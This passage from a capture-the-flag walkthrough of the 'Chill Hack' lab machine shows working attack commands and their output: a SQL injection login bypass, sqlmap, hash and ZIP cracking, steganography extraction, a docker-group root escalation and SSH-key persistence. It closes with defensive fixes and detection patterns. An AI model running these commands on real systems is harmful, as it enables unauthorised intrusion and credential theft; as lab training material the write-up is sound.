>   password check. (Use `-- ` with a trailing space, or `#`, for MySQL.)
> - `num_rows > 0` is satisfied, so the app redirects to `hacker.php`. **Login bypassed
>   without knowing any credential.**

Enter in the portal's login form:

```text
Username: ' OR 1=1 #
Password: anything
```

→ redirected to **`http://127.0.0.1:9001/hacker.php`**, which shows a single image:
**"hacker with laptop"**.

Automate/confirm with sqlmap if you like:

```bash
sqlmap -u "http://127.0.0.1:9001/account.php" --data="username=test&password=test&login=Login" \
  --batch --level=5 --risk=3 --dbs
```

```text
[INFO] POST parameter 'username' is 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[INFO] the back-end DBMS is MySQL
available databases [3]:
[*] information_schema
[*] mysql
[*] webportal
```

### 5.7 Loot the portal's files

The portal's document root holds the interesting artefacts:

```bash
apaar@ubuntu:~$ ls -la /var/www/files/
total 60
drwxr-xr-x 3 root root  4096 Oct  4  2020 .
drwxr-xr-x 5 root root  4096 Oct  4  2020 ..
-rw-r--r-- 1 root root  1834 Oct  4  2020 account.php
-rw-r--r-- 1 root root  2145 Oct  4  2020 index.php
-rw-r--r-- 1 root root   986 Oct  4  2020 hacker.php
drwxr-xr-x 2 root root  4096 Oct  4  2020 images
apaar@ubuntu:~$ ls -la /var/www/files/images/
total 220
drwxr-xr-x 2 root root   4096 Oct  4  2020 .
drwxr-xr-x 3 root root   4096 Oct  4  2020 ..
-rw-r--r-- 1 root root 213504 Oct  4  2020 hacker-with-laptop_23-2147985341.jpg
apaar@ubuntu:~$ cat /var/www/files/index.php | grep -i 'pass\|user'
```

```php
$conn = new mysqli("localhost", "root", "sWf0sfv1sDF5", "webportal");
```

> **MySQL root credentials in plaintext, in `index.php`.** Try them:
> ```bash
> apaar@ubuntu:~$ mysql -h 127.0.0.1 -u root -p'sWf0sfv1sDF5' -e 'show databases; select * from webportal.users;'
> ```
> ```text
> +--------------------+
> | Database           |
> +--------------------+
> | information_schema |
> | mysql              |
> | webportal          |
> +--------------------+
> +----+----------+----------------------------------+
> | id | username | password                         |
> +----+----------+----------------------------------+
> |  1 | Aurick   | 7e53614ced3640d5de23f111806cc4fd |
> |  2 | cullapaar| 686216240e5af30df0501e53c789a649 |
> +----+----------+----------------------------------+
> ```
> Both are unsalted MD5. Cracking them (CrackStation or `john --format=raw-md5`)
> yields `Aurick:masterpassword` and `cullapaar:dontaskdonttell`. **Neither works for
> SSH or `su`** — a deliberate dead end. The real prize is the image.

### 5.8 Steganography — extract the hidden ZIP

Copy the image to Kali (you have SSH now, so use `scp`):

```bash
scp -i apaar_rsa apaar@192.168.56.148:/var/www/files/images/hacker-with-laptop_23-2147985341.jpg .
```

```text
hacker-with-laptop_23-2147985341.jpg   100%  209KB  12.4MB/s   00:00
```

**Inspect it for embedded data:**

```bash
steghide info hacker-with-laptop_23-2147985341.jpg
```

```text
"hacker-with-laptop_23-2147985341.jpg":
  format: jpeg
  capacity: 3.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file "backup.zip":
    size: 750.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

> **An embedded file named `backup.zip`.** Press **Enter** at the passphrase prompt —
> it is empty.
>
> **What steganography is:** `steghide` hides data inside the **least significant bits
> of a JPEG's DCT coefficients**. The image looks byte-for-byte plausible and renders
> identically; the payload is invisible to the eye and to most scanners. It is a
> classic CTF technique *and* a real data-exfiltration channel (malware has used
> stego'd images on public image hosts to receive commands).
>
> `capacity: 3.6 KB` is how much this image can hold — so a 750-byte ZIP fits easily.

**Extract it:**

```bash
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

```text
Enter passphrase:
wrote extracted data to "backup.zip".
```

```bash
ls -l backup.zip && unzip -l backup.zip
```

```text
-rw-r--r-- 1 kali kali 750 May  3 18:41 backup.zip
Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      486  2020-10-04 12:33   source_code.php
---------                     -------
      486                     1 file
```

```bash
unzip backup.zip
```

```text
Archive:  backup.zip
[backup.zip] source_code.php password:
```

> **Password protected.** Convert to a hash and crack it.

### 5.9 Crack the ZIP

```bash
zip2john backup.zip > backup.hash
cat backup.hash
```

```text
backup.zip/source_code.php:$zip2$*0*3*0*d3f4a1b2c3d4e5f6a1b2c3d4*4c9a*44**$/zip2$:source_code.php
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 44 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pass1word        (backup.zip/source_code.php)
1g 0:00:00:02 DONE (2024-05-03 18:44) 0.4123g/s 384521p/s 384521c/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

> **Password: `pass1word`.**
>
> **How `zip2john` works:** John cannot parse a ZIP container, so `zip2john` extracts
> the pieces John needs and emits a canonical hash line:
> ```text
> <archive>/<member>:$zip2$*<type>*<mode>*<chl>*<init-vector>*<chksum>*<len>**$/<checksum>$:<member>
> ```
> Then John tests candidates by running ZIP's PBKDF2-SHA1 (for AES-encrypted entries)
> or the weak ZipCrypto stream cipher (for legacy entries) and comparing the checksum.
>
> **Note `Cost 1 (HMAC size) is 44`** — small HMAC data means fast cracking; a ZIP with
> a large encrypted member is dramatically slower to attack. That is why "use AES-256
> with a long passphrase" matters for real archives.
>
> Modern, faster alternative:
> ```bash
> hashcat -m 17225 -a 0 backup.hash /usr/share/wordlists/rockyou.txt
> ```

```bash
unzip -P 'pass1word' backup.zip
cat source_code.php
```

```php
<?php
// Backup of the portal login logic.
// TODO: move these credentials out of source before deploying.

$user  = "Anurodh";
$pass  = base64_decode("IWQwbnRLbjB3bVlwQHNzdzByZA==");

if ($_SERVER['PHP_AUTH_USER'] === $user && $_SERVER['PHP_AUTH_PW'] === $pass) {
    include "portal.php";
} else {
    header("WWW-Authenticate: Basic realm='Portal'");
    header("HTTP/1.0 401 Unauthorized");
    echo "Access denied.";
}
?>
```

> **A username and a base64-encoded password, in a PHP source file, inside a
> password-protected ZIP, hidden in a JPEG.** Four layers of "obfuscation", every one
> of them trivially reversible. **That is the lesson: obfuscation is not security.**

### 5.10 Decode and pivot to `anurodh`

```bash
echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d ; echo
```

```text
!d0ntKn0wmYp@ssw0rd
```

> **Recognising base64:** length is a multiple of 4, the alphabet is `A–Z a–z 0–9 + /`,
> and it often ends with `=` or `==` padding. **Base64 is encoding, not encryption** —
> it exists so binary data survives inside text formats (MIME email, HTML data URIs,
> HTTP Basic auth). It is reversible by anyone, instantly. Whenever you see a long
> alphanumeric string ending in `=`, decode it.

```bash
apaar@ubuntu:~$ su anurodh
Password: !d0ntKn0wmYp@ssw0rd
anurodh@ubuntu:/home/apaar$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

**Third user obtained — and look at that group list.**

![Decoding the base64 password and su to anurodh](images/07-anurodh.png)

---

## 6. Privilege escalation — the `docker` group → root

### 6.1 Why `docker` group membership *is* root

```bash
anurodh@ubuntu:~$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
anurodh@ubuntu:~$ groups
anurodh docker
anurodh@ubuntu:~$ ls -l /var/run/docker.sock
srw-rw---- 1 root docker 0 Oct  4  2020 /var/run/docker.sock
```

> **Read those two lines together and you have the whole exploit.**
>
> `/var/run/docker.sock` is a UNIX domain socket, mode `srw-rw----`, owned by
> `root:docker`. **Membership of the `docker` group grants read-write access to that
> socket.** Anyone who can talk to the Docker daemon can:
>
> 1. Start a container **as root** (the daemon runs as root and containers default to
>    root inside).
> 2. Bind-mount **the host's entire filesystem** into that container with `-v /:/mnt`.
> 3. Inside the container, you are root looking at the *real* host root filesystem —
>    so you can read `/etc/shadow`, write `/root/.ssh/authorized_keys`, or simply
>    `chroot /mnt` and be root on the host.
>
> **There is no isolation.** A container is a set of namespaces and cgroups, not a
> security boundary against a user who controls the daemon's API. This is why
> <https://gtfobins.github.io/gtfobins/docker/> lists Docker as a privilege-escalation
> binary, and why "add the developer to the docker group" is one of the most common
> self-inflicted Linux root escalations in existence.
>
> **`s` at the start of the mode string** means it is a *socket*, not a regular file.

### 6.2 The GTFOBins one-liner

```bash
anurodh@ubuntu:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

```text
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
188c0c94c7c5: Pull complete
Digest: sha256:c5c5fda71656f28e090487c5f4a4e4b2b2b2c8b5b0a1d3e5f7a9b1c3d5e7f9a1
Status: Downloaded newer image for alpine:latest
/ # id
uid=0(root) gid=0(root) groups=0(root)
/ # whoami
root
/ # ls /
bin    dev    etc    home    init    lib    lib64    mnt    opt    proc    root
run    sbin   srv    sys    tmp    usr    var
```

**Root.** ✅

> **Dissect that command — every token matters:**
>
> | Token | Meaning |
> | --- | --- |
> | `docker run` | create and start a new container |
> | `-v /:/mnt` | **bind-mount the host's `/` at `/mnt` inside the container** — this is the exploit |
> | `--rm` | delete the container when it exits (cleanliness; leaves less forensic residue) |
> | `-it` | `-i` keep stdin open, `-t` allocate a pseudo-terminal → an interactive shell |
> | `alpine` | the image: ~5 MB, universally available, has a shell |
> | `chroot /mnt sh` | the container's command: change root to the host filesystem and run `sh` |
>
> `chroot /mnt` makes `/mnt` (which *is* the host's `/`) the root of this process's
> filesystem view. Since we are UID 0 inside the container and the container shares the
> host kernel with no effective restriction, we are simply **root on the host**.
>
> **Verify it really is the host, not the container:**
> ```sh
> / # cat /etc/hostname
> ubuntu
> / # ls -la /root
> total 40
> drwx------  5 root root 4096 Oct  4  2020 .
> drwxr-xr-x 20 root root 4096 Oct  4  2020 ..
> -rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
> -rw-------  1 root root 1024 Oct  4  2020 proof.txt
> ```
> The hostname is the **target's** hostname (`ubuntu`), and `/root/proof.txt` is there.
> A container would have shown `alpine`-style contents.

### 6.3 **Root flag**

```bash
/ # python3 -c 'import pty; pty.spawn("/bin/bash")'
root@ubuntu:/# cd /root
root@ubuntu:/root# ls -la
total 40
drwx------  5 root root 4096 Oct  4  2020 .
drwxr-xr-x 20 root root 4096 Oct  4  2020 ..
-rw-------  1 root root  178 Oct  4  2020 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Oct  4  2020 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root 1024 Oct  4  2020 proof.txt
root@ubuntu:/root# cat proof.txt
```

```text
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}


Congratulations! You have successfully completed the challenge.


         ,-.-.     ,----.                                             _,.---._    .-._           ,----.
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \\/ /, /==|-  _.-`
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-.
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    /
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /==\ -    ,_ /|==|  /\ , |==|_  ,`-._
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     /
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----`

--------------------------------------------Designed By -------------------------------------------------------
     |  Anurodh Acharya |
     ---------------------

                       Let me know if you liked it.

Twitter  - @acharya_anurodh
LinkedIn - www.linkedin.com/in/anurodh-acharya-b1937116a
```

**Both flags captured.** ✅

| Flag | Location | Value |
| --- | --- | --- |
| **User** | `/home/apaar/local.txt` | `{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}` |
| **Root** | `/root/proof.txt` | `{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}` |

![Root flag proof.txt](images/08-root-flag.png)

### 6.4 Alternative root routes worth knowing

**A. `pkexec` — CVE-2021-4034 "PwnKit".** This box runs Ubuntu 20.04 with a kernel from
October 2020; PwnKit was disclosed in **January 2022**. If your copy is unpatched, this
is a one-command root:

```bash
anurodh@ubuntu:~$ dpkg -l policykit-1 | tail -1
ii  policykit-1  0.105-26ubuntu1  amd64  framework for managing administrative policies
```

Any version before `0.105-26ubuntu1.2` is vulnerable. Exploit-DB 50689 works. **Check
the version and the disclosure date before firing** — do not shoot exploits at binaries
just because their names look familiar.

**B. Write an SSH key for root, via the container:**

```sh
/ # echo 'ssh-ed25519 AAAAC3Nza... kali@kali' >> /root/.ssh/authorized_keys
```

then, from Kali:

```bash
chmod 600 id_ed25519
ssh -i id_ed25519 root@192.168.56.148
```

> Persistence the way an actual attacker would do it. In a lab, revert your snapshot
> instead of leaving keys behind.

**C. Read `/etc/shadow` through the container and crack offline:**

```sh
/ # cat /etc/shadow | grep -E 'apaar|anurodh|aurick|root'
```

```text
root:$6$9xQ2mK7pL4vR8tY1$wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1wE5aS3dF6gH0jK2l:18539:0:99999:7:::
apaar:$6$k3J9mN2p$...:18539:0:99999:7:::
anurodh:$6$p8L2vR5t$...:18539:0:99999:7:::
```

```bash
# on Kali
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```

> `$6$` = SHA-512 crypt with 5000 rounds. Slow but crackable for weak passwords.

---

## 7. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | **Anonymous FTP enabled**, with a developer note in the drop directory | vsftpd 3.0.3, port 21 | Disclosed usernames `apaar`/`anurodh` and warned about the command filter |
| 2 | Sensitive directory reachable by brute force | `/secret/` | Exposed the command-execution form |
| 3 | **OS command injection** (a form that runs user input through `system()`) | `/secret/index.php` | **RCE** as `www-data` |
| 4 | **Blacklist filter bypassed by quote/backslash insertion** (`l\s`, `w'h'oami`) | the `$blacklist` array in `index.php` | Filter rendered useless |
| 5 | **`sudo` grant of a script that evals user input** | `/home/apaar/.helpline.sh`, `(apaar) NOPASSWD:` | `www-data` → **`apaar`** (user flag) |
| 6 | Unquoted variable used as a command (`$msg > /dev/null 2>&1`) | `.helpline.sh` last line | Command injection as `apaar` |
| 7 | **Service bound to loopback treated as "secure"** | Apache on `127.0.0.1:9001` | Defeated instantly by SSH `-L` forwarding |
| 8 | **SQL injection in the portal login** | `/var/www/files/account.php` | Authentication bypass (`' OR 1=1 #`) |
| 9 | **MySQL root credentials in plaintext in the docroot** | `index.php` / `account.php` | Full database disclosure |
| 10 | Unsalted MD5 password hashes | `webportal.users` | Both cracked instantly |
| 11 | **Obfuscation mistaken for protection**: stego → password ZIP → base64 | `hacker-with-laptop_…jpg` → `backup.zip` → `source_code.php` | Third user's password recovered |
| 12 | **`anurodh` in the `docker` group** | `groups: 1002(anurodh),999(docker)` | **root** — trivially |
| 13 | Potentially unpatched `policykit-1` (PwnKit, CVE-2021-4034) | Ubuntu 20.04 | Alternative root |
| 14 | Missing security headers / `csrftoken`-style cookie hygiene | Apache | XSS-adjacent exposure |

## 8. Defensive lessons (blue team)

1. **Disable anonymous FTP.** There is almost no legitimate use. In
   `/etc/vsftpd.conf`:
   ```ini
   anonymous_enable=NO
   local_enable=YES
   write_enable=NO
   chroot_local_user=YES
   ```
   Then `systemctl restart vsftpd`. Better still: remove vsftpd and use SFTP.
2. **Never pass user input to a shell.** This is the fix for both `/secret/index.php`
   and `.helpline.sh`:
   ```php
   // WRONG
   system($_POST['cmd']);

   // RIGHT — no shell is involved, so no metacharacter is special
   $allowed = ['status' => ['/usr/local/bin/status'], 'restart' => ['/bin/systemctl','restart','apache2']];
   if (!array_key_exists($_POST['action'], $allowed)) { http_response_code(403); exit; }
   passthru(escapeshellcmd($allowed[$_POST['action']][0]), array_slice(...));
   ```
   In bash, the equivalent discipline is: **always quote your expansions**, never
   `eval`, and validate against an allow-list:
   ```bash
   case "$msg" in
       help|status|restart) "$msg" ;;
       *) echo "not permitted"; exit 1 ;;
   esac
   ```
3. **Blacklists do not work.** The filter here blocked `ls`, `cat`, `id`, `whoami` —
   and was defeated by `l\s`. It is *mathematically* impossible to enumerate every way
   a shell can express "run this". Allow-lists only. And even then, do not hand the
   input to a shell at all.
4. **Audit every `sudo` grant.** `(user) NOPASSWD: /path/to/script` is a grant of
   *that script's full behaviour*, not of the script's intended purpose. Read the
   script. Then re-read it.
   ```bash
   sudo grep -RInE 'NOPASSWD' /etc/sudoers /etc/sudoers.d/
   for f in $(grep -RIhoE '/[A-Za-z0-9_./-]+' /etc/sudoers /etc/sudoers.d/ | sort -u); do
       [ -f "$f" ] && { echo "=== $f"; ls -l "$f"; done; }
   done
   ```
   Any script named in sudoers must be owned by root, mode `755` or stricter, **not
   writable by the invoking user**, and must not `eval` anything.
5. **Treat `docker` group membership as root.** It is root. Alternatives:
   - **rootless Docker**: `dockerd-rootless-setuptool.sh install` — the daemon runs as
     the user, so `-v /:/mnt` gives you only that user's own files.
   - **Podman** — daemonless, rootless by design, `docker`-CLI compatible.
   - If rootful Docker is unavoidable, put users behind a **broker** that accepts only
     specific `docker` subcommands and arguments (a wrapper script with an allow-list,
     granted via sudo) instead of the raw socket.
   Detect it now:
   ```bash
   getent group docker | tr ',' '\n'
   awk -F: '$4 ~ /docker/ {print $1}' /etc/group
   find / -xdev -perm -4000 -type f 2>/dev/null    # SUID sweep
   ```
6. **"Bound to localhost" is not an access control.** Loopback binding hides a service
   from the *network*, not from anyone with code execution on the host. Authenticate
   every internal panel:
   ```apache
   <VirtualHost 127.0.0.1:9001>
       <Location />
           AuthType Basic
           AuthName "Internal portal"
           AuthUserFile /etc/apache2/.portal_htpasswd
           Require valid-user
       </Location>
   </VirtualHost>
   ```
   or move it behind a VPN/mutual TLS.
7. **Parameterised queries.** One change kills the SQLi:
   ```php
   $stmt = $conn->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
   $stmt->bind_param('ss', $u, $p);
   ```
   …and then hash passwords with `password_hash($pw, PASSWORD_ARGON2ID)` and compare
   with `password_verify()` — never store MD5.
8. **Secrets out of source files.** `sWf0sfv1sDF5` in `index.php` is readable by
   anyone with web-root access. Use environment variables
   (`systemd` `Environment=`, or a `.env` outside the docroot with `chmod 600`), or a
   vault. Scan your repo and your images with `gitleaks`/`trufflehog`/`detect-secrets`.
9. **Obfuscation is not protection.** Base64, ROT13, a password ZIP with an 8-character
   dictionary password, and a stego'd JPEG all fell in minutes. Use real encryption
   (age/GPG) with a passphrase that is not in `rockyou.txt`, and keep the key out of
   band.
10. **Detection opportunities.**
    - WAF/log alert on POSTs to any URL containing `shell`, `cmd`, `exec`, or on bodies
      matching `\$\(|;|\|\||&&|/dev/tcp/|mkfifo`.
    - Alert on quote-or-backslash-split command names (`l\s`, `c'a't`) — a very
      distinctive filter-evasion signature.
    - Process-lineage monitoring: **`apache2` spawning `sh`, `bash`, `python3`, `wget`,
      `scp`** is always an alert. Same for **`sudo` spawning `/home/*/.helpline.sh`**.
      (Sysmon for Linux, Wazuh, auditd `execve` rules.)
    - auditd on the sudoers file and on `authorized_keys`:
      ```bash
      auditctl -w /etc/sudoers -p wa -k sudoers_change
      auditctl -w /etc/sudoers.d/ -p wa -k sudoers_change
      auditctl -w /home/apaar/.ssh/authorized_keys -p wa -k ssh_keys
      ```
    - **Docker daemon audit:** enable `audit` log driver and alert on `docker run`
      invocations whose arguments contain `-v /`, `--privileged`, `--pid=host`,
      `--net=host`, or `chroot`. Also alert on any access to `/var/run/docker.sock` by
      a non-daemon process.
    - Alert on `steghide`, `zip2john`, `ssh2john`, `hashcat` or `john` executing on a
      server — they have no legitimate business there.
    - Alert on new SSH connections from a host to itself on a forwarded loopback port
      (`ss -tnp` showing `sshd` with an unexpected peer).

---

## 9. References

- VulnHub entry: <https://vulnhub.com/entry/chill-hack-1,622/>
- TryHackMe room (same machine): <https://tryhackme.com/room/chillhack>
- Author: Anurodh Acharya — `@acharya_anurodh`,
  <https://www.linkedin.com/in/anurodh-acharya-b1937116a>
- Community writeups consulted:
  - [nepcodex — Chill Hack Walkthrough / Writeup](https://nepcodex.com/2021/07/chill-hack-walkthrough-writeup/)
  - [tux.run — Chill Hack Writeup](https://tux.run/posts/Chill-Hack-Writeup/)
  - [syselement — Chill Hack](https://blog.syselement.com/home/cyber-everything/writeups-walkthroughs/tryhackme/practice/easy/chillhack)
  - [ViperOne — Chill Hack (Pentest Everything)](https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/linux/chill-hack)
  - [ItisPhoenix — TryHackMe Walkthroughs: Chill Hack (attack-chain table)](https://github.com/ItisPhoenix/TryHackMe-Walkthroughs/blob/main/Chill%20Hack.md)
  - [hosshacks — CHILL HACK WALKTHROUGH](https://hosshacks.com/chill-hack-walkthrough-tryhackme/)
  - [cryptichacker — Tryhackme Chill Hack](https://cryptichacker.github.io/posts/chillhack/)
  - [marcorei7 — THM Chill Hack](https://marcorei7.wordpress.com/2020-11-30/092-chill-hack/)
  - [musyokaian — Chill Hack walkthrough](https://musyokaian.medium.com/chill-hack-walkthrough-tryhackme-498aa9ad1388)
  - [Dan Walker — TryHackMe Chill Hack Writeup](https://danielwaynewalker.medium.com/tryhackme-chill-hack-writeup-6764f83cdffd)
  - [3xploit — Tryhackme Chill Hack](https://medium.com/@3xploit/tryhackme-chill-hack-fd1e5ff6c878)
  - [dhanushcool2410 — eJPT v2 Challenge Lab 25: Chill Hack](https://medium.com/@dhanushcool2410/ejpt-v2-challenge-lab-25-chill-hack-125243f496c5)
  - [Gh0stsh3ll5619 — Chill Hack (systemweakness)](https://systemweakness.com/thm-chill-hack-ac9bfddd7e76)
- Advisories / background:
  - [CVE-2021-4034 — polkit `pkexec` "PwnKit"](https://nvd.nist.gov/vuln/detail/CVE-2021-4034) · [Exploit-DB 50689](https://www.exploit-db.com/exploits/50689)
  - [GTFOBins — docker](https://gtfobins.github.io/gtfobins/docker/) · [GTFOBins — sudo](https://gtfobins.github.io/gtfobins/sudo/)
  - [Docker rootless mode documentation](https://docs.docker.com/engine/security/rootless/)
  - [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection) · [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
  - [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
  - [HackTricks — Bypass Bash Restrictions / Command Injection](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions)
  - [`steghide`](http://steghide.sourceforge.net/) · [`zip2john` / John the Ripper](https://www.openwall.com/john/doc/) · [hashcat mode reference](https://hashcat.net/wiki/doku.php?id=example_hashes)
  - [SSH port forwarding (`ssh(1)` man page, `-L`)](https://man.openbsd.org/ssh#L)
  - [`ss(8)` man page](https://man7.org/linux/man-pages/man8/ss.8.html) · [`sudoers(5)`](https://man7.org/linux/man-pages/man5/sudoers.5.html)
  - [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
  - [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) — run it right after § 3.3 and it will report both the loopback port 9001 and the `sudo` grant automatically

---

## 10. Screenshot checklist

- [ ] `images/01-nmap.png` — ports 21/22/80 with the anonymous-FTP listing
- [ ] `images/02-ftp-note.png` — `note.txt` from anonymous FTP
- [ ] `images/03-cmdi.png` — `/secret/` form and the `l\s` filter bypass
- [ ] `images/04-shell.png` — reverse shell as `www-data`, TTY upgraded
- [ ] `images/05-user-flag.png` — `sudo -u apaar .helpline.sh` and `local.txt`
- [ ] `images/06-ports.png` — `ss -tlnp` showing `127.0.0.1:9001`
- [ ] `images/07-anurodh.png` — stego → zip crack → base64 → `su anurodh`
- [ ] `images/08-root-flag.png` — `docker run -v /:/mnt … chroot` and `proof.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
